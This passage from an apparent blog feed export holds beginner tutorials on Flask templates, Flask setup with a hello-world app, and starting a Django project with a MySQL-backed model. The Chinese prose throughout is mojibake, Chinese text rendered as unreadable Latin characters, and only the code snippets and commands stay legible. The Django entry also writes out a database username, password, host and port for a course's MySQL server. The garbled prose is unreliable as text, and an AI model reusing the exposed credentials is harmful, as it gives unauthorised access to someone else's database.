class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è¿›è¡Œå¿«é€Ÿæ¸²æŸ“äº†</p><h5 id="æœ€åæ¨¡ç‰ˆç»§æ‰¿">æœ€å,æ¨¡ç‰ˆç»§æ‰¿</h5><p>æŠ½è±¡çš„è¯´ä¸å¤ªå¥½è¯´,ç›´æ¥ç”¨ä¾‹å­è¯´æ˜å§ é¦–å…ˆtemplatesé‡Œé¢å†™ä¸€ä¸ª(app/templates/base.html)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&#123;% if title %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Microblog: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">&#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åœ¨(app/templates/index.html)é‡Œé¢å»å†™</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;post.author.nickname&#125;&#125; says: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;post.body&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±ç›¸å½“äºæŠŠindex.htmlçš„block contentåˆ°endblockä¸­é—´çš„ä¸œè¥¿æ”¾åˆ°base.htmlçš„block contentå’Œendblockä¸­é—´ç„¶åè¿”å›base.htmlç»™ç”¨æˆ·,è¿™å°±æ˜¯æ¨¡ç‰ˆçš„ç»§æ‰¿ ç»ˆäºå‰é¢djangoçš„å‘è¢«å¡«ä¸Šäº†....</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flaskå­¦ä¹ (1)ç¯å¢ƒä»¥åŠhello world</title>
      <link href="/2017/08/16/flask%E5%AD%A6%E4%B9%A01%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8Ahello-world/"/>
      <url>/2017/08/16/flask%E5%AD%A6%E4%B9%A01%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8Ahello-world/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆå­¦ä¹ çš„é“¾æ¥<a href="http://www.pythondoc.com/flask-mega-tutorial/index.html">http://www.pythondoc.com/flask-mega-tutorial/index.html</a> åœ¨æ•™ç¨‹çš„å¼€å¤´å­¦ä¹ åˆ°äº†ä¸€ä¸ªæ–°å§¿åŠ¿,åœ¨åšé¡¹ç›®çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª<strong>è™šæ‹Ÿç¯å¢ƒ</strong> åˆ›å»ºè™šæ‹Ÿç¯å¢ƒçš„å¥½å¤„: 1ã€<strong>ä¸ä¼šå½±å“ä¸»ç¯å¢ƒ</strong> 2ã€<strong>ä¸éœ€è¦æ‹¥æœ‰ä¸»æœºçš„rootæƒé™</strong></p><h5 id="ä¸€.æ€ä¹ˆåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ">ä¸€.æ€ä¹ˆåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ:</h5><p>æ¯”å¦‚æˆ‘ä»¬åœ¨æ¡Œé¢åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å«microblog,ç„¶åè¿›å…¥ç›®å½•æ‰“å¼€å‘½ä»¤çª—å£,è¾“å…¥ virtualenv Â flask,å¦‚æœæ²¡æœ‰virtualenvçš„è¯å°±ç”¨pipå»è£…ä¸€ä¸ª ç„¶åå»Scriptsä¸‹é¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ flask\Scripts\pip install flask</span><br><span class="line">$ flask\Scripts\pip install flask-login</span><br><span class="line">$ flask\Scripts\pip install flask-openid</span><br><span class="line">$ flask\Scripts\pip install flask-mail</span><br><span class="line">$ flask\Scripts\pip install flask-sqlalchemy</span><br><span class="line">$ flask\Scripts\pip install sqlalchemy-migrate</span><br><span class="line">$ flask\Scripts\pip install flask-whooshalchemy</span><br><span class="line">$ flask\Scripts\pip install flask-wtf</span><br><span class="line">$ flask\Scripts\pip install flask-babel</span><br><span class="line">$ flask\Scripts\pip install guess_language</span><br><span class="line">$ flask\Scripts\pip install flipflop</span><br><span class="line">$ flask\Scripts\pip install coverage</span><br></pre></td></tr></table></figure><p>ç„¶åcdåˆ°microblogé‡Œé¢å»åˆ›å»ºæ–‡ä»¶ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir app</span><br><span class="line">mkdir app/static</span><br><span class="line">mkdir app/templates</span><br><span class="line">mkdir tmp</span><br></pre></td></tr></table></figure><p>å’Œä¸Šæ¬¡çš„djangoä¸€æ ·,appè£…åº”ç”¨,staticè£…csså’Œjs,templatesé‡Œé¢è£…æ¨¡ç‰ˆæ–‡ä»¶ ç„¶åç»™appå†™ä¸€ä¸ªåˆå§‹åŒ–è„šæœ¬(app/<strong>init</strong>.py)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> views</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬å…ˆåˆ›å»ºåº”ç”¨,ç„¶åå¯¼å…¥views,viewså’Œä¹‹å‰djangoé‡Œé¢ä½œç”¨åº”è¯¥æ˜¯ä¸€æ ·çš„(åˆå­¦è€…...) ç„¶åå¼€å§‹å†™è§†å›¾å‡½æ•°(app/views.py)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">Â Â Â Â Â <span class="keyword">return</span> <span class="string">&#x27;Hello,world!&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ€åè¿˜éœ€è¦ä¸€ä¸ªå¯åŠ¨è„šæœ¬run.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!flask/bin/python</span></span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line">app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åå»localhostå°±å¯ä»¥çœ‹åˆ°hello worldäº†</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆå­¦django</title>
      <link href="/2017/08/01/%E5%88%9D%E5%AD%A6django/"/>
      <url>/2017/08/01/%E5%88%9D%E5%AD%A6django/</url>
      
        <content type="html"><![CDATA[<p>bilibilié‡Œé¢å¥‡é‡djangoå¼€å‘è§†é¢‘,ç‚¹è¿›å»ä¸€çœ‹,å‘ç°æ˜¯ä¸ªé›¶åŸºç¡€æ•™å­¦,äºæ˜¯å°±è‡ªå·±è¯•ç€ç»ƒäº†ç»ƒ,è¿™é‡Œå†™ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹.æœ€ç»ˆæˆæœæ˜¯ Â Â <a href="http://novel.tanzhouvip.com/">http://novel.tanzhouvip.com/</a> å½“ç„¶,è¿™ä¸ªæ˜¯ä¸€ä¸ªå¤§ä½¬å†™çš„,æˆ‘åªæ˜¯æŒ‰ç…§ä»–çš„æ“ä½œæ¥ç»ƒä¹ ä¸€ä¸‹ é¦–å…ˆè€å¸ˆå¼ºæ¨pycharm,è¯´ä»¥åçš„ä¼ä¸šå¯èƒ½ä¼šå¼ºåˆ¶è¦æ±‚ä½¿ç”¨pycharm,æ‰€ä»¥æœ€å¥½æŒæ¡ä¸‹. ç„¶åä¸¤ç§åˆ›å»ºdjangoé¡¹ç›®çš„æ–¹æ³•,ä¸€ç§æ˜¯æ§åˆ¶å°,å¦å¤–ä¸€ç§æ˜¯pycharmåˆ›å»º (å‰æ’å£°æ˜,é¦–å…ˆä½ çš„ç”µè„‘å¿…é¡»æœ‰django,å¦åˆ™ä»€ä¹ˆéƒ½ä¸ç”¨è°ˆäº†,å¦‚æœæ²¡æœ‰å°±å»pipè£…ä¸€ä¸ª,ç„¶åpython2æˆ–è€…3éƒ½æ— æ‰€è°“)</p><h5 id="æ§åˆ¶å°åˆ›å»ºçš„æ–¹æ³•">æ§åˆ¶å°åˆ›å»ºçš„æ–¹æ³•</h5><p>æ¡Œé¢åˆ›å»ºä¸€ä¸ªdemo2,ç„¶åè¿›å»,å¼€æ§åˆ¶å° è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject xiaoshuo</span><br></pre></td></tr></table></figure><p>ç„¶åä½ çš„demo2é‡Œé¢å°±ä¼šæœ‰ä¸€ä¸ªå«xiaoshuoçš„é¡¹ç›®æ–‡ä»¶å¤¹,é‡Œé¢åŒ…å«ä¸€ä¸ªxiaoshuoä¸»ç¨‹åºçš„æ–‡ä»¶å¤¹å’Œä¸€ä¸ªmanage.pyçš„ä¸»æ§åˆ¶æ–‡ä»¶ å…¶ä¸­ä¸»ç¨‹åºé‡Œé¢æœ‰settings.py(å…¨å±€è®¾ç½®æ–‡ä»¶),urls.py(ä¸»è·¯ç”±æ§åˆ¶æ–‡ä»¶),views.py(),wsgiéƒ¨ç½²æ–‡ä»¶. <img src="/images/2017/07/django-1.png" alt="blacsheep" /> æ‰€æœ‰ç½‘ä¸Šçš„é¡¹ç›®çš„ä¸šåŠ¡é€»è¾‘éƒ½æ˜¯ç”±appå®ç°çš„,djangoæœ¬èº«æ²¡æœ‰ä¸šåŠ¡é€»è¾‘,æ‰€ä»¥ä¸‹é¢åˆ›å»ºåº”ç”¨ æ§åˆ¶å°cdè¿›å…¥xiaoshuoæ–‡ä»¶ è¿›å…¥ä¹‹åè¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py startapp novel</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šæœ‰ <img src="/images/2017/07/django-2.png" alt="blacsheep" /> å½“ç„¶è¿™ç§æ–¹æ³•åé¢ä¼šæœ‰é—®é¢˜,è¿™ä¸ªåé¢å†æ</p><h5 id="ä¸‹é¢ä½¿ç”¨pycharmæ–¹æ³•æ¥åˆ›å»ºdjangoé¡¹ç›®">ä¸‹é¢ä½¿ç”¨pycharmæ–¹æ³•æ¥åˆ›å»ºdjangoé¡¹ç›®</h5><p>åˆ›å»ºé¡¹ç›®,é€‰æ‹©é…ç½®,åˆ›å»ºnovelçš„appå’Œtemplatesæ¨¡ç‰ˆ <img src="/images/2017/07/django-3.png" alt="blacsheep" /> åˆ›å»ºä¹‹åå°±å¯ä»¥æœ‰ä¸€ä¸ªæœ€ç®€å•çš„é¡µé¢äº† <img src="/images/2017/07/django-4.png" alt="blacsheep" /> ç”šè‡³è¿˜æœ‰äº†åå° <img src="/images/2017/07/django-5.png" alt="blacsheep" /> ç„¶åå¦‚æœæƒ³è¦æŠŠè¯­è¨€è®¾ç½®ä¸ºä¸­æ–‡çš„è¯,å°±å»settingsé‡Œé¢æŠŠlanguage_codeä»en-usæ”¹æˆzh-hans <img src="/images/2017/07/django-6.png" alt="blacsheep" /> åˆ°è¿™é‡Œåˆ›å»ºå°±okäº†</p><h4 id="åé¢ç®€å•çš„å­¦äº†ä¸€ä¸‹åº”è¯¥å†™åç«¯...ä¹Ÿåªæ˜¯ç®€å•åœ°å­¦äº†ä¸€ä¸‹">åé¢ç®€å•çš„å­¦äº†ä¸€ä¸‹åº”è¯¥å†™åç«¯...ä¹Ÿåªæ˜¯ç®€å•åœ°å­¦äº†ä¸€ä¸‹</h4><p>é¦–å…ˆå…ˆä»‹ç»ä¸€ä¸‹æ¯ä¸ªæ–‡ä»¶å¤¹å§ <img src="/images/2017/07/django-7.png" alt="blacsheep" /> demo1æ˜¯é¡¹ç›®æ–‡ä»¶ <strong>init</strong>æ˜¯å°†novelè¿™ä¸ªç›®å½•å®šä¹‰æˆä¸€ä¸ªåŒ….å¦‚æœä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶,é‚£ä¹ˆè¿™ä¸ªç›®å½•å°±ä»…ä»…æ˜¯ä¸€ä¸ªç›®å½•è€Œä¸æ˜¯ä¸€ä¸ªåŒ…,æ‰€ä»¥å°±ä¸å¯ä»¥å¯¼å…¥ settingsæ˜¯è¿™ä¸ªé¡¹ç›®çš„ä¸»è®¾ç½®æ–‡ä»¶,æˆ‘ä»¬è¿˜å¯ä»¥å¢åŠ ä¸€äº›è®¾ç½®æ–‡ä»¶,ä½†æ˜¯è¿™ä¸ªsettingsæ˜¯ä¸»è®¾ç½®æ–‡ä»¶ urlsæ˜¯è·¯ç”±æ–‡ä»¶,è·¯ç”±çš„ä½œç”¨:ç›¸å½“äºæ˜ å°„å™¨,æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šæœ‰è·¯ç”±ä¼ ç»™åº”ç”¨ç„¶åè¿”å›ä¸åŒé¡µé¢ wsgiæ˜¯é¡¹ç›®éƒ¨ç½²æœåŠ¡å™¨çš„æ—¶å€™çš„æ–‡ä»¶ åé¢çš„novelæ˜¯appåº”ç”¨ migrationsæ˜¯appåç»­æ˜ å°„æ•°æ®åº“çš„ä¸€ä¸ªæ–‡ä»¶å¤¹ adminæ˜¯ä¸€ä¸ªç®¡ç†æ–‡ä»¶ modelsæ˜¯è£…æ•°æ®åº“æ¨¡å‹çš„ viewsæ˜¯å®ç°ä¸šåŠ¡é€»è¾‘çš„ä¸»è¦æ–‡ä»¶ templatesä¸€èˆ¬æ”¾åœ¨åº”ç”¨ä¸­,æ‰€ä»¥è¿™ä¸ªç›´æ¥åˆ æ‰</p><h4 id="ä»‹ç»å®Œæ¯•ä¸‹é¢å¼€å§‹é¡µé¢çš„å®ç°">ä»‹ç»å®Œæ¯•ä¸‹é¢å¼€å§‹é¡µé¢çš„å®ç°</h4><p>é¦–å…ˆä¸€å¼€å§‹ä¸»é¡µæˆ‘ä»¬ä¸èƒ½è®©å®ƒæ˜¯é»˜è®¤çš„å§,å…ˆæä¸ªhello worldå˜› æä¸ªé¡µé¢çš„è¯å°±éœ€è¦è·¯ç”±æ¥å¤„ç†,æ‰€ä»¥æˆ‘ä»¬æ¥çœ‹urlsæ–‡ä»¶ <img src="/images/2017/07/django-8.png" alt="blacsheep" /> é‡Œé¢æœ‰ä¸ªadminæ–‡ä»¶,äº¤ç»™äº†admin.site.urlsæ¥å¤„ç† ç„¶ååŒ¹é…adminçš„æ–¹æ³•æ˜¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ ä¸‹é¢æˆ‘ä»¬è¦å†™ä¸€ä¸ªindexé¡µé¢çš„è¯å°±æ˜¯ç›¸å½“äºé¡µé¢åé¢ä¸ºç©º,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™æˆè¿™æ · <img src="/images/2017/07/django-9.png" alt="blacsheep" /> ä½†æ˜¯åˆéœ€è¦åº”ç”¨æ¥å¤„ç†,æ‰€ä»¥æˆ‘ä»¬è¦å»novelè¿™ä¸ªåº”ç”¨é‡Œé¢çš„viewså»å†™ä¸šåŠ¡é€»è¾‘ <img src="/images/2017/07/django-10.png" alt="blacsheep" /> æœ‰äº†ä¸šåŠ¡é€»è¾‘ä¹‹å,æˆ‘ä»¬å†åœ¨urlsé‡Œé¢åŠ å…¥å¯¼å…¥app,ç„¶ååœ¨åŠ ä¸Šä¸šåŠ¡é€»è¾‘,å¦‚ä¸‹ <img src="/images/2017/07/django-11.png" alt="blacsheep" /> ç„¶åæˆ‘ä»¬å†å»è¿è¡Œä¸€ä¸‹ç¨‹åº <img src="/images/2017/07/django-12.png" alt="blacsheep" /> æˆåŠŸå¾—åˆ°äº†hello world å¯¹äº†,http.responseé‡Œé¢æ˜¯å¯ä»¥åŠ æ ‡ç­¾çš„å“Ÿ,é‡Œé¢çš„è¯­å¥ä¼šç›´æ¥å½“ä½œhtmlæ¥è§£æ é™¤æ­¤ä¹‹å¤–,å¦‚æœåšç§»åŠ¨å¹³å°çš„å¼€å‘éœ€è¦jsonæ ¼å¼çš„è¯ é‚£ä¹ˆè¿˜å¯ä»¥å¯¼å…¥django.httpé‡Œé¢çš„JsonResponse <img src="/images/2017/07/django-13.png" alt="blacsheep" /> æ•ˆæœå›¾ <img src="/images/2017/07/django-14.png" alt="blacsheep" /> ç„¶è€Œè¿™äº›htmlå°±ç”±å‰ç«¯äººå‘˜æ¥å¼€å‘äº†,å½“ç„¶æœ‰çš„å…¬å¸è¿˜æ˜¯è¦åç«¯æ¥å†™... åæ­£éƒ½æ‡‚çš„è¯ä¼šå¥½å¾ˆå¤šå˜›.. è¿™é‡Œå°±ç”¨ä¸€ä¸‹è€å¸ˆçš„å‰ç«¯èµ„æºå’¯ <a href="https://pan.tanzhouvip.com/s/bSIWcerh">https://pan.tanzhouvip.com/s/bSIWcerh</a> å‰ç«¯ä¼šç»™ä¸€ä¸ªç±»ä¼¼äº‘ç›˜é‡Œé¢çš„æ–‡ä»¶å¤¹,ç„¶åå°±æ˜¯ç”±åç«¯äººå‘˜æ¥å¼€å‘äº†</p><h4 id="æ¨¡æ‹Ÿä¼ä¸šå¼€å‘">æ¨¡æ‹Ÿä¼ä¸šå¼€å‘</h4><h5 id="é¦–é¡µçš„è®¾ç½®è¿ç”¨render">é¦–é¡µçš„è®¾ç½®:è¿ç”¨render</h5><p>åœ¨appæ–‡ä»¶å¤¹é‡Œé¢åˆ›å»ºä¸€ä¸ªtemplatesæ–‡ä»¶å¤¹,å½“ç„¶åœ¨æ ¹ç›®å½•åˆ›å»ºä¹Ÿå¯ä»¥,ä¸è¿‡åˆ†appåˆ›å»ºæ›´æ¸…æ™° åˆ›å»ºä¹‹åæŠŠå‰ç«¯ç»™æˆ‘ä»¬çš„ä¸œè¥¿æ”¾åœ¨templatesé‡Œé¢,æ¯”å¦‚index.html ç„¶åæˆ‘ä»¬å»novelçš„views.pyé‡Œé¢ <img src="/images/2017/07/django-15.png" alt="blacsheep" /> è¿™æ ·å°±æœ‰äº†ä¸€ä¸ªè¾ƒä¸ºæ ‡å‡†çš„ä¸»é¡µ(å½“ç„¶,é™æ€çš„æ ·å¼è¡¨jsä»€ä¹ˆçš„è¿˜æ²¡æœ‰æ”¹è·¯å¾„,è€Œä¸”è¿˜æ²¡æœ‰æå–æ•°æ®åº“çš„èµ„æº) æ•ˆæœå›¾ <img src="/images/2017/07/django-16.png" alt="blacsheep" /> å¾ˆä¸‘...æ²¡åŠæ³•,cssè¿˜æ²¡æœ‰è½½å…¥è¿›å» è¿™é‡Œæœ‰ä¸€ä¸ªå°é—®é¢˜,å¦‚æœä½ æ˜¯ç”¨æ§åˆ¶å°åˆ›å»ºçš„é¡¹ç›®çš„è¯,å¯èƒ½è¿™é‡Œä¼šæ‰¾ä¸åˆ°index.html åŸå› å°±æ˜¯ä½ çš„é¡¹ç›®çš„settingsé‡Œé¢å¹¶æ²¡æœ‰å¯¼å…¥åº”ç”¨,å¯¼å…¥ä½ç½®å¦‚ä¸‹å›¾ å¦‚æœä¸æ˜¯ç”¨pycharmå°±ä¸ä¼šæœ‰novelè¿™ä¸€è¡Œ,æ‰‹åŠ¨æ·»åŠ å°±okäº†. <img src="/images/2017/07/django-17.png" alt="blacsheep" /> ç„¶åæˆ‘ä»¬çœ‹æˆ‘ä»¬çš„ç½‘é¡µ,è¶…çº§ä¸‘æœ‰æœ¨æœ‰,å› ä¸ºcssæ²¡æœ‰æ­£ç¡®çš„å¯¼å…¥ æ€ä¹ˆå¯¼å…¥å‘¢? æ‰€æœ‰çš„webæ¡†æ¶éƒ½è®¾ç½®æœ‰ä¸€ä¸ªé™æ€æ–‡ä»¶çš„æ–‡ä»¶å¤¹(é»˜è®¤ä¸ºstatic),æ”¾åœ¨äº†settingsé‡Œé¢ <img src="/images/2017/07/django-20.png" alt="blacsheep" /> å¦‚æœéœ€è¦å¯ä»¥æ”¹æˆç¬¬ä¸‰æ–¹çš„æœåŠ¡å•†,ç„¶åè¿™ä¸ªstaticä¸€èˆ¬æ¥è¯´æ˜¯å’Œåº”ç”¨é‡Œé¢çš„templatesæ¨¡ç‰ˆæ”¾åœ¨åŒä¸€ä¸ªç›®å½• <img src="/images/2017/07/django-18.png" alt="blacsheep" /> ç„¶åç”±äºè·¯å¾„ä¸åŒ,æ‰€ä»¥ä¾ç„¶è¦è¿›è¡Œæ›´æ”¹ ä¸€ç§æ¯”è¾ƒç¬¨çš„æ–¹æ³•æ˜¯æŠŠåŸæ¥indexé‡Œé¢çš„/css/style.cssæ”¹æˆ../static/css/style.css,ç„¶åå°±å¯ä»¥è½½å…¥ ä½†æ˜¯è¿™ç§æ–¹æ³•å¾ˆç¬¨,ä¸å®¹æ˜“ç»´æŠ¤,æ‰€ä»¥ä¸€èˆ¬ä¸ç”¨,æ¯”è¾ƒå¥½ç”¨çš„æ–¹æ³•æ˜¯ä»€ä¹ˆå‘¢? æˆ‘ä»¬å¯ä»¥loadä¸€ä¸ªstatic æ¯”å¦‚ <img src="/images/2017/07/django-21.png" alt="blacsheep" /> ç„¶åå¯ä»¥å¾—åˆ°çš„æ•ˆæœæ˜¯ <img src="/images/2017/07/django-19.png" alt="blacsheep" /> ç„¶åè€å¸ˆè¯´æœ‰ä¸€ç§æ¨¡ç‰ˆçš„ç»§æ‰¿,ä½†å­¦ç”Ÿå¬ä¸æ‡‚æ‰€ä»¥ä¸è®²,æˆ‘ä¹Ÿå¾ˆæ— å¥ˆ,å…ˆå­¦ç®€å•çš„å§,å¤æ‚çš„ç­‰å­¦çš„å¥½ä¸€ç‚¹äº†å†å»çœ‹å’¯ ç„¶åæ‹¿åˆ°é™æ€æ–‡ä»¶ä¹‹åå°±æ˜¯æ•°æ®çš„é—®é¢˜äº†,å› ä¸ºç½‘ç«™çš„æ•°æ®åº”è¯¥æ˜¯åŠ¨æ€çš„æ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä»æ•°æ®åº“é‡Œé¢å»è°ƒå– é‚£ä¹ˆæˆ‘ä»¬å°±è¦å…ˆæŠŠæ•°æ®åº“é…ç½®ä¸€ä¸‹,å»settings.pyé‡Œé¢æ‰¾databases ç„¶åå¼€å§‹ä¿®æ”¹ ENGINEé‡Œé¢çš„sqlite3æ”¹æˆmysql(è‡ªå·±ç”¨çš„ä»€ä¹ˆå°±å†™ä»€ä¹ˆ) NAMEæ”¹æˆè‡ªå·±çš„,ä¸‹é¢çš„åŒç†,è¿™é‡Œç”¨è€å¸ˆçš„èµ„æºå’¯,å†™novel USERæ˜¯novel PASSWORDæ˜¯qiangzi() HOSTæ˜¯mysql.litianqiang.com PORT:7150 å¦‚ä¸‹å›¾ <img src="/images/2017/07/django-22.png" alt="blacsheep" /> æ—¢ç„¶æœ‰ç°æˆçš„æ•°æ®åº“é‚£æˆ‘ä»¬ç›´æ¥åœ¨é¡¹ç›®çš„modelsé‡Œé¢ç”Ÿæˆæ•°æ®åº“çš„æ¨¡å‹å°±å¥½äº† æ–¹æ³•:ä¸»é¡¹ç›®ç›®å½•å¼€cmd,ç„¶åè¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py inspectdb &gt; novel/models.py</span><br></pre></td></tr></table></figure><p>ä¹Ÿå³æŠŠæ•°æ®åº“æ˜ å°„åˆ°novelçš„models.pyæ–‡ä»¶ä¸­ è¿™é‡Œå¦‚æœpythonæ²¡æœ‰è£…mysqlçš„è¯ä¼šæŠ¥é”™,å¯ä»¥å»csdnä¸Šé¢å»ä¸‹è½½ç„¶åå®‰è£… å¦‚æœåœ¨pythoné‡Œé¢<code>import MySQLdb</code>æ²¡æœ‰æŠ¥é”™çš„è¯å°±è¯´æ˜å®‰è£…æˆåŠŸäº† å®Œæˆåè¾“å…¥å‘½ä»¤è¡Œçš„å‘½ä»¤åä½ çš„novelä¸‹é¢çš„modelsé‡Œé¢ä¼šè‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“çš„æ¨¡å‹ <img src="/images/2017/08/django-23.png" alt="blacsheep" /> å…¶ä¸­æ¨¡å‹é‡Œé¢çš„æ¯ä¸€ä¸ªç±»ä»£è¡¨ä¸€ä¸ªè¡¨,æ¯ä¸€ä¸ªè¡¨çš„å±æ€§è¡¨ç¤ºåˆ— å¦‚æœè¦ä½¿ç”¨æ•°æ®åº“çš„å†…å®¹çš„è¯,å°±éœ€è¦åœ¨viewsé‡Œé¢å»è°ƒç”¨äº†,æ¯”å¦‚ä¸‹é¢å›¾ç‰‡ä¸­ <img src="/images/2017/08/django-24.png" alt="blacsheep" /> é¦–å…ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from models import NovelCopy</span><br></pre></td></tr></table></figure><p>æ˜¯å¼•å…¥æ•°æ®åº“æ¨¡å‹,ç„¶åä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NovelCopy.objects.get(é™åˆ¶æ¡ä»¶)</span><br></pre></td></tr></table></figure><p>æ¥è·å–<strong>å•æ¡æ•°æ®</strong>(åˆ—),ç„¶åè¾“å‡ºæ•°æ®çš„æŸä¸ªå­—æ®µ,æ¯”å¦‚è¿™é‡Œçš„novelnameå­—æ®µ,è¾“å‡ºç»“æœå¦‚ä¸‹å›¾ <img src="/images/2017/08/django-25.png" alt="blacsheep" /> å¯ä»¥çœ‹åˆ°è¾“å‡ºäº†å°è¯´åç§°:å°†å¤œ å¦‚æœéœ€è¦æŸ¥è¯¢å¤šæ¡æ•°æ®çš„è¯,é‚£ä¹ˆå¯ä»¥ç”¨filteræ¥æ›¿æ¢get,æ¯”å¦‚æˆ‘ä»¬ç°åœ¨è¦æŠŠä¸»é¡µçš„å››æœ¬å°è¯´çš„åå­—ä»æ•°æ®åº“å–å‡ºæ¥,é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è¿™ä¹ˆå†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">novelCopy=NovelCopy.objects.<span class="built_in">filter</span>().order_by(<span 